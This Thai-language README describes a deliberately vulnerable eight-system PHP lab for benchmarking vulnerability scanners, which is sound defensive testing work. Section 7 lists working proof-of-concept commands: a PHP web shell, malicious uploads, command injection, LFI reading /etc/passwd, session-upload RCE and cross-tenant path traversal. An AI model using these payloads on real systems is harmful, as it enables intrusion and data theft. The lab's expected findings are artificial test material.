# OPScaner PHP2Shell Lab — 8 ระบบจำลองสำหรับวัดผลโปรแกรม VA

ระบบจำลองที่มีช่องโหว่ตระกูล **PHP2Shell (Remote Code Execution ผ่าน PHP)** จำนวน 8 ระบบ
แต่ละระบบเปิดคนละพอร์ต (8081–8088) และมีจุดอ่อนคนละแบบตามกลุ่มระบบจริง
ใช้สำหรับ **วัดว่าโปรแกรม VA scanner ของคุณตรวจพบช่องโหว่ได้ครบทุกอุปกรณ์/ทุกกลุ่มระบบหรือไม่**

> ⚠️ ใช้เฉพาะในวงแล็บที่ควบคุมได้ ห้ามเปิดพอร์ตเหล่านี้ออกอินเทอร์เน็ต
> credential ทั้งหมดเป็นข้อมูลสมมุติสำหรับการทดสอบ (ถ้าเผลอใช้ค่าจริง ให้เปลี่ยนทันที)

---

## 1. แผนที่พอร์ตและระบบ

| # | พอร์ต | กลุ่มระบบ | ผลิตภัณฑ์จำลอง | Stack ที่ประกาศ | ช่องโหว่หลัก |
|---|-------|-----------|----------------|-----------------|--------------|
| 1 | 8081 | เว็บไซต์และระบบภายในองค์กร (CMS) | CorpPress CMS 5.8.2 | PHP 7.4.33 / Apache 2.4.41 | อัปโหลดไฟล์ผ่านปลั๊กอินโดยไม่ตรวจนามสกุล → ฝัง web shell ใน webroot |
| 2 | 8082 | ระบบหลังบ้านแอปมือถือและ API (Framework) | FieldOps API v1.14.2 | PHP 7.4.33 / nginx | `unserialize()` ข้อมูลจาก API (object injection) → เขียนไฟล์ → รันโค้ด; อัปโหลด avatar ไม่ตรวจชนิด |
| 3 | 8083 | Hosting Control Panel | HostAdmin 110.0.24 (รันด้วย root) | PHP 7.4.33 / Apache | ตรวจแค่ MIME จาก client; API เชื่อ header `X-Role` → ยกระดับสิทธิ์ |
| 4 | 8084 | ซอฟต์แวร์/อุปกรณ์สำเร็จรูป (Appliance/IoT) | NetGuard Pro 3000 fw 2.4.1 (EOL) | PHP 5.6.40 / lighttpd | OS command injection 2 จุด + อัปโหลดเฟิร์มแวร์ไม่ตรวจลายเซ็น |
| 5 | 8085 | Container และ Docker Image | order-api:1.4.0 | PHP 8.1.2 / Apache | อัปโหลดในอิมเมจ → ยึดคอนเทนเนอร์; รันเป็น root + mount `docker.sock` + `privileged` |
| 6 | 8086 | Windows ที่มี PHP (IIS/XAMPP) | HR Portal บน IIS 10 | PHP 7.4.33 / IIS 10 | handler mapping `*.jpg` → php-cgi ทำให้ `shell.php.jpg` รันได้; `cmd.exe` injection |
| 7 | 8087 | ระบบทดสอบ/ระบบเก่า/ระบบสำรอง (Dev/UAT/Staging/DR) | DMS Staging 2018.11.07 | PHP 5.6.40 / Apache | debug mode, phpinfo, `.git`, backup config, LFI และ `session.upload_progress` + LFI → RCE |
| 8 | 8088 | ระบบที่ผู้ให้บริการภายนอกดูแล (Shared/Managed Hosting) | CloudShare (2 tenants) | PHP 7.4.33 / Apache | path traversal ข้าม tenant, upload directory ใช้ร่วมกัน, ไม่มี `open_basedir` |

พอร์ต **8080** เป็น portal (dashboard) รวมรายการเป้าหมายและ health check — ไม่ใช่เป้าสแกน

---

## 2. โครงสร้างไฟล์

```
lab/
├── portal.php                 # dashboard (8080) + health check 8 ระบบ
├── start_lab.sh               # เปิดทั้ง 9 บริการ (sandbox / เครื่องของคุณ)
├── stop_lab.sh                # ปิดทั้งหมด
├── verify_lab.sh              # ยิง PoC ตรวจว่าทุกช่องโหว่ยังทำงาน (21 checks)
├── targets.txt                # รายชื่อเป้าหมายสำหรับ import เข้า VA
├── expected_findings.csv      # ตาราง finding ที่ "ควรตรวจพบ" 30 รายการ (CWE/OWASP/PoC)
├── va_scorecard.csv           # ไฟล์ให้คะแนน coverage ต่อระบบ (มีสูตรคำนวณ)
├── docker-compose.yml         # รัน 9 คอนเทนเนอร์ บนพอร์ตเดียวกัน (8080–8088)
├── docker/
│   ├── Dockerfile             # image เดียว ใช้ซ้ำทั้ง 8 ระบบ
│   └── entrypoint.sh          # เลือก app + port ผ่าน env LAB_APP / LAB_PORT
├── common/lab.php             # helper ร่วม (HTML template, serve ไฟล์, health JSON)
├── etc/app1.ini … app8.ini    # php.ini แยกโปรไฟล์ต่อระบบ (debug, upload_progress, session path)
└── apps/app1 … app8/router.php # โค้ดของแต่ละระบบ (router ตัวเดียวจบ)
```

ข้อมูลประกอบ: `apps/app7/backup/config.old.txt` (ไฟล์ตั้งค่าเก่าที่หลุด),
`apps/app8/tenants/tenant_{a,b}/{config.php,db_backup.sql}` (ข้อมูลข้าม tenant)

---

## 3. วิธีรัน

### 3.1 ใน sandbox / เครื่องเดียว (PHP built-in server)

```bash
cd PHP2Shell-Lab        # โฟลเดอร์ที่แตกจาก zip
chmod +x start_lab.sh stop_lab.sh verify_lab.sh   # ถ้า unzip ไม่คงสิทธิ์ไว้
bash start_lab.sh       # เปิด 8080–8088
bash verify_lab.sh      # ตรวจช่องโหว่ทั้ง 8 ระบบ → ต้องได้ 21 passed, 0 failed
bash stop_lab.sh
```

(ใช้ `bash` นำหน้าได้เสมอ แม้สิทธิ์ไฟล์จะไม่ถูกต้อง)

ต้องมี `php` (>= 8.1) และ `curl` ในเครื่อง เปิด portal ที่ `http://127.0.0.1:8080`

> sandbox ของ Base44 ไม่เปิดพอร์ตออกอินเทอร์เน็ต โปรแกรม VA ที่อยู่นอกเครื่องจะเข้าถึงไม่ได้
> ให้ใช้วิธี 3.2 บน VM/เครื่องที่ scanner มองเห็น

### 3.2 บนเครื่อง/VM ที่โปรแกรม VA เข้าถึงได้ (แนะนำ)

```bash
cd lab
docker compose up -d --build        # 9 คอนเทนเนอร์: portal + app1..app8
docker compose ps
curl http://<lab-ip>:8080/          # portal ต้องขึ้น 8/8 systems up
```

แต่ละระบบเป็นคอนเทนเนอร์แยก (คนละ hostname) แต่ผูกพอร์ต host ตรงกับตารางด้านบน
แก้ `targets.txt` ให้เป็น IP ของเครื่องนั้น แล้ว import เข้า VA scanner ได้เลย

ปิด: `docker compose down`

---

## 4. ผลตรวจสอบ (baseline ของแล็บ)

`bash verify_lab.sh` รัน PoC จริงกับทุกพอร์ต ผลล่าสุด: **21 passed / 0 failed**

| ระบบ | PoC ที่ผ่าน |
|------|-------------|
| 8081 | อัปโหลด `.php` เข้า webroot แล้วรันได้; `/readme.html` เปิดเผยเวอร์ชัน |
| 8082 | อัปโหลด avatar แล้วรัน; object injection เขียนไฟล์+rัน; `/.env` หลุด |
| 8083 | อัปโหลดด้วย MIME ปลอมแล้วรันใน docroot ของ tenant; `X-Role` เข้าถึง API ระดับ reseller |
| 8084 | command injection ที่ `diag.php` และ `status.cgi`; อัปโหลดเฟิร์มแวร์แล้วรัน |
| 8085 | อัปโหลดเข้า volume แล้วรัน; disclosure `docker.sock`/privileged |
| 8086 | `shell.php.jpg` รันผ่าน `*.jpg` handler; `cmd` injection |
| 8087 | phpinfo, `.git`, backup config, LFI `/etc/passwd`, session-upload-progress → RCE |
| 8088 | อัปโหลดเข้า shared dir แล้วรัน; traversal อ่าน config ของ tenant อื่น |

---

## 5. วิธีเอาไปวัดผลโปรแกรม VA

1. แก้ `targets.txt` ให้เป็น IP/โดเมนของ lab
2. สแกนด้วยโปรแกรม VA (credentialed หรือ uncredentialed ก็ได้; แล็บนี้ไม่มี auth gate ที่พอร์ตส่วนใหญ่)
3. export ผลออกมาเป็น CSV/JSON แล้วเทียบกับ `expected_findings.csv`
4. กรอก `va_scorecard.csv`:
   - คอลัมน์ `detected` = จำนวน finding ที่ scanner รายงานถูก (นับเฉพาะที่มีหลักฐานยืนยัน)
   - `coverage_percent` คำนวณอัตโนมัติ (30 finding ทั้งหมด)

**เกณฑ์ผ่านที่แนะนำ**

| ตัวชี้วัด | เป้าหมาย |
|----------|----------|
| ตรวจพบ RCE/upload ที่ทำงานได้จริง (F*—1 ของทุกกลุ่ม) | 8/8 ระบบ |
| Coverage รวมทุก finding | ≥ 80% (24/30) |
| False negative ที่อันตราย (พลาด upload → RCE) | 0 |
| False positive บนระบบที่ "ไม่ควรมี" | ต้องแยกได้ (ดูข้อ 6) |

**จุดที่ scanner มักพลาด (ใช้เป็นจุดสังเกต)**

- **8086**: double extension ที่อาศัย handler mapping ของ IIS ไม่ใช่ RFI/LFI ทั่วไป
- **8087 F7-5**: ต้องเชื่อมสองขั้น (เขียน session file → include) ไม่ใช่การอัปโหลดตรง ๆ
- **8088 F8-1**: traversal ต้องเดา parameter `file=` และ `tenant=` ให้ถูก
- **8083 F3-2**: ช่องโหว่ระดับสิทธิ์ ต้องรู้จัก header `X-Role` (ไม่มีใน signature ทั่วไป)
- **8082 F2-1**: object injection ต้องสร้าง serialized payload เอง (ไม่มี publicly known CVE)

---

## 6. ข้อจำกัดที่ต้องเข้าใจก่อนสรุปผล

1. **เป็นระบบจำลอง ไม่ใช่ WordPress/Drupal/Laravel ของจริง** — fingerprint (banner, `readme`, `X-Powered-By`) ถูกสร้างขึ้น
   ถ้า scanner ตรวจด้วย "version → CVE mapping" อย่างเดียว ผลจะสะท้อน banner ที่เราตั้ง ไม่ใช่ CVE จริง
   แต่ถ้า scanner ตรวจ *behavior* (อัปโหลดแล้วรันได้, injection, traversal) ผลจะตรงกับความจริงของโค้ดในแล็บ
2. รันบน PHP built-in server: ไม่มี Apache/IIS จริง, single-threaded, และ Windows/IIS ถูกจำลองด้วย router
   (จำลองกฎ NTFS/handler mapping ตามพฤติกรรมจริง แต่ไม่ใช่ IIS ตัวจริง)
3. ไม่มี auth/SSO/WAF จริง — ตัวเลข coverage ที่ได้จึงเป็น "ขีดความสามารถในการตรวจจับช่องโหว่" ไม่ใช่ภาพรวมทั้งระบบ
4. credential ในแล็บเป็นค่าสมมุติ อย่านำไปใช้ที่อื่น และถ้า `secret.txt` ที่แนบมาเป็นของจริง ให้ rotate ทันที

---

## 7. PoC ย่อ (ใช้ตรวจมือทีละระบบ)

```bash
# 1) CMS — upload → web shell
printf '<?php echo "PWN:".shell_exec($_GET["c"]); ?>' > /tmp/s.php
curl -F "file=@/tmp/s.php;filename=s.php" http://T:8081/wp-content/plugins/simple-media-upload/upload.php
curl "http://T:8081/wp-content/uploads/s.php?c=id"

# 2) API — object injection (สร้าง payload ด้วย php -r ดูใน verify_lab.sh)
curl -X PUT --data-binary @/tmp/s.php -H "X-Filename: s2.php" http://T:8082/api/v1/profile/avatar
curl "http://T:8082/storage/s2.php?c=id"

# 3) Panel — MIME ปลอม → docroot ของ tenant
curl -F "tenant=demo" -F "file=@/tmp/s.php;filename=s3.php;type=image/png" http://T:8083/panel/filemanager/upload
curl -H "X-Role: reseller" http://T:8083/panel/api/accounts

# 4) Appliance — command injection
curl "http://T:8084/diag.php?target=127.0.0.1;id&format=json"

# 5) Container — upload → volume
curl -F "file=@/tmp/s.php;filename=s5.php" http://T:8085/api/upload/attachments
curl "http://T:8085/public/storage/s5.php?c=id"

# 6) Windows/IIS — double extension
curl -F "file=@/tmp/s.php;filename=s6.php.jpg" http://T:8086/portal/upload.aspx
curl "http://T:8086/uploads/s6.php.jpg?c=id"

# 7) Staging — LFI + session upload progress
curl "http://T:8087/?page=/etc/passwd"
curl -b "PHPSESSID=lab7poc" --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["c"]); ?>' \
     -F "f=@/etc/hostname" http://T:8087/upload_progress.php
curl "http://T:8087/?page=/tmp/sess_lab7poc&c=id"

# 8) Shared hosting — traversal ข้าม tenant
curl "http://T:8088/download.php?tenant=tenant_a&file=../tenant_b/config.php"
```

(`T` = host ของ lab)

---

## 8. ปรับแต่งต่อยอด

- เพิ่มระบบใหม่: สร้าง `apps/app9/router.php` + `etc/app9.ini` แล้วเพิ่ม service ใน `docker-compose.yml`
  และเพิ่มใน `TARGETS` ของ `portal.php`
- ต้องการระบบที่ "ปลอดภัย" เพื่อวัด false positive: ทำสำเนา app1 เป็น `app9` แล้วเพิ่มการตรวจนามสกุล/MIME
  และย้าย upload ออกจาก webroot (ควรได้ 0 finding)
- ต้องการยืนยันว่า scanner ตรวจจาก behavior จริง: เปลี่ยน banner (`X-Powered-By`) ให้เป็นเวอร์ชันที่ยังไม่ถูก patch
  แล้วดูว่า scanner ยังตรวจพบอยู่หรือแค่เดาจาก version
